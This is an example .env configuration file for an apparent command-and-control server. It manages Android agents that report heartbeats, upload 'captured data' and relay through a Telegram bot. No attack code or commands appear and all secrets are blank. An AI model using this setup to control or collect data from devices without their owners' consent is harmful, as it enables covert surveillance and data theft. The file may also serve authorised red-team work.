# ─── Control server ────────────────────────────────────────────────────────
# Copy to .env and adjust. Never commit the real thing.

# Operator password for the dashboard. If unset, one is generated on first
# run, printed in the server banner, and stored in
# data/c2_operator_password.secret
C2_OPERATOR_PASSWORD=

# Shared secret between the panel and the agents. Must match C2_API_KEY used
# to build the APK. If unset, one is generated into data/c2_api_key.secret —
# you then have to rebuild the agent with that value.
C2_API_KEY=

# Session signing key. Generated into data/c2_secret.secret if unset.
C2_SECRET=

# ─── Network ───────────────────────────────────────────────────────────────
# Loopback by default. Expose it with a tunnel you control rather than
# binding every interface.
C2_HOST=127.0.0.1
C2_PORT=5000

# ─── Storage ───────────────────────────────────────────────────────────────
# Mutable state and captured data. Keep outside the repo.
C2_DATA_DIR=./data
C2_UPLOAD_FOLDER=./data/uploads
C2_DB_URI=sqlite:///./c2.db

# ─── Behaviour ─────────────────────────────────────────────────────────────
# Seconds without a heartbeat before a device is shown offline.
C2_HEARTBEAT_TIMEOUT=60
C2_REAPER_INTERVAL=15
C2_MAX_UPLOAD_MB=1024

# ─── Android agent build (required by agent_android/app/build.gradle) ─────
# The build fails loudly if any of these is missing — there are no defaults.
TG_BOT_TOKEN=
TG_CHAT_ID=
C2_URL=

# ─── Telegram bridge (telegram_bridge.py) ─────────────────────────────────
C2_BASE=http://127.0.0.1:5000